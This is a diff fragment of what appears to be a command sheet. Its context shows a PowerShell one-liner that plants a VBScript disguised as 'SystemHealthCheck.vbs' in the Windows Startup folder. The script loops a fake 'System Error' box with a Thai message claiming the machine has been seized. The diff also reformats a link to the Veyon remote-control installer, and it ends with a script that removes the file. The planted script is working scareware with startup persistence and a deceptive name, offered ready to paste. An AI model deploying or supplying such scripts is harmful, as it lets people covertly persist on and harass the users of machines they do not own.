@@ -4,9 +4,7 @@
 $path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemHealthCheck.vbs"; $code = 'Do : MsgBox "แฮ่! เครื่องนี้โดนยึดแล้ว ห้ามปิดนะจ๊ะ", 16, "System Error" : WScript.Sleep 60000 : Loop'; Set-Content -Path $path -Value $code; Invoke-Item $path
 ```
 
-```bash
-https://github.com/veyon/veyon/releases/download/v4.10.2/veyon-4.10.2.0-win64-setup.exe
-```
+(https://github.com/veyon/veyon/releases/download/v4.10.2/veyon-4.10.2.0-win64-setup.exe)
 
 ```bash
 $path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemHealthCheck.vbs"; Stop-Process -Name "wscript" -Force -ErrorAction SilentlyContinue; if (Test-Path $path) { Remove-Item -Path $path -Force; Write-Host "Success" -ForegroundColor Green } else { Write-Host "Not Found" -ForegroundColor Yellow }
